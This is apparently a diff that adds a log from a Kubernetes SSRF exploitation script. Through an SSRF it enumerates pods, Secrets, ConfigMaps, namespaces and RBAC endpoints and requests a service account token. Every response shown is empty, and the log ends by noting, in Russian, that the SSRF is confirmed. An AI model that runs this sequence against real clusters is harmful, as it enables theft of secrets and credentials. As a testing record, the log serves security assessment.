@@ -1,0 +1,49 @@
+[2025-12-10 18:01:51] [INFO] Starting Kubernetes SSRF exploitation...
+[2025-12-10 18:01:51] [INFO] Logging in...
+[2025-12-10 18:02:12] [SUCCESS] Login successful
+[2025-12-10 18:02:12] [INFO] 
+======================================================================
+[2025-12-10 18:02:12] [INFO] CRITICAL: SSRF to Kubernetes API Server
+[2025-12-10 18:02:12] [INFO] ======================================================================
+[2025-12-10 18:02:12] [INFO] 
+[1] Listing Pods in default namespace...
+[2025-12-10 18:02:13] [INFO]   Status: 200
+[2025-12-10 18:02:13] [INFO]   Response length: 2
+[2025-12-10 18:02:13] [INFO]   Response: {}...
+[2025-12-10 18:02:13] [INFO] 
+[2] Listing Secrets in default namespace...
+[2025-12-10 18:02:14] [INFO]   Status: 200
+[2025-12-10 18:02:14] [INFO]   Response length: 2
+[2025-12-10 18:02:14] [INFO]   Response: {}...
+[2025-12-10 18:02:14] [INFO] 
+[3] Listing ConfigMaps in default namespace...
+[2025-12-10 18:02:15] [INFO]   Status: 200
+[2025-12-10 18:02:15] [INFO]   Response length: 2
+[2025-12-10 18:02:15] [INFO] 
+[4] Getting Service Account Token...
+[2025-12-10 18:02:16] [INFO]   Status: 200
+[2025-12-10 18:02:16] [INFO]   Response: {}...
+[2025-12-10 18:02:17] [INFO] 
+[5] Listing All Namespaces...
+[2025-12-10 18:02:18] [INFO]   Status: 200
+[2025-12-10 18:02:18] [INFO]   Response length: 2
+[2025-12-10 18:02:18] [INFO] 
+[6] Listing Deployments...
+[2025-12-10 18:02:19] [INFO]   Status: 200
+[2025-12-10 18:02:19] [INFO] 
+[7] Testing other Kubernetes endpoints...
+[2025-12-10 18:02:19] [INFO]   Testing: /api/v1/nodes
+[2025-12-10 18:02:20] [INFO]   Testing: /api/v1/persistentvolumes
+[2025-12-10 18:02:21] [INFO]   Testing: /api/v1/persistentvolumeclaims
+[2025-12-10 18:02:21] [INFO]   Testing: /apis/apps/v1/deployments
+[2025-12-10 18:02:22] [INFO]   Testing: /apis/networking.k8s.io/v1/networkpolicies
+[2025-12-10 18:02:23] [INFO]   Testing: /apis/rbac.authorization.k8s.io/v1/roles
+[2025-12-10 18:02:24] [INFO]   Testing: /apis/rbac.authorization.k8s.io/v1/rolebindings
+[2025-12-10 18:02:25] [INFO] 
+======================================================================
+[2025-12-10 18:02:25] [INFO] RESULTS - KUBERNETES SSRF EXPLOITATION
+[2025-12-10 18:02:25] [INFO] ======================================================================
+[2025-12-10 18:02:25] [INFO] SSRF подтвержден, но детали требуют дальнейшего анализа
+[2025-12-10 18:02:25] [INFO] Все попытки залогированы в: logs/kubernetes_ssrf_20251210_180151.log
+[2025-12-10 18:02:25] [INFO] ======================================================================
+[2025-12-10 18:02:25] [INFO] Log file: logs/kubernetes_ssrf_20251210_180151.log
